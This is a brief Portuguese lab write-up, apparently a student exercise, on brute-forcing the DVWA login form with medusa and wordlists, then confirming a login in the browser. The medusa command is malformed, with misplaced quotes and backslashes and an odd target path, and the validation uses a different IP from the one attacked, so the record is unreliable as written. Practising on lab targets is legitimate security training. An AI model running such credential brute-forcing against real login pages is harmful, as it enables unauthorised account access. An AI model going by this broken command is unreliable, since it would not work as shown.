## Execução e comando usado

**Resumo do que foi feito:**  
Analisei o formulário via *Inspecionar (DevTools)* para identificar os nomes dos campos (`username`, `password`) e a string que indica falha de login (ex.: `"Login failed"`). Em seguida executei força‑bruta com **medusa** usando duas wordlists (usuários e senhas).

**Comando:**
```bash
medusa -h 192.168.56.102 -U wordlists/web-users.txt -P wordlists/web-pass.txt \
  -M http \ -m "POST:192.168.56.102/dvwa/login.php/index.php \ -m FORM:username=^USER^&password=^PASS^&Login=Login" \ -m :"Fail=Login failed" -T 6
```

## Validação

Acessei http://192.168.56.101/dvwa/ no navegador e efetuei login com os dados fornecidos pelo medusa.

Salvei o request HTTP que confirmou o login em scans/dvwa-request.txt (copiado do DevTools → Network → request payload).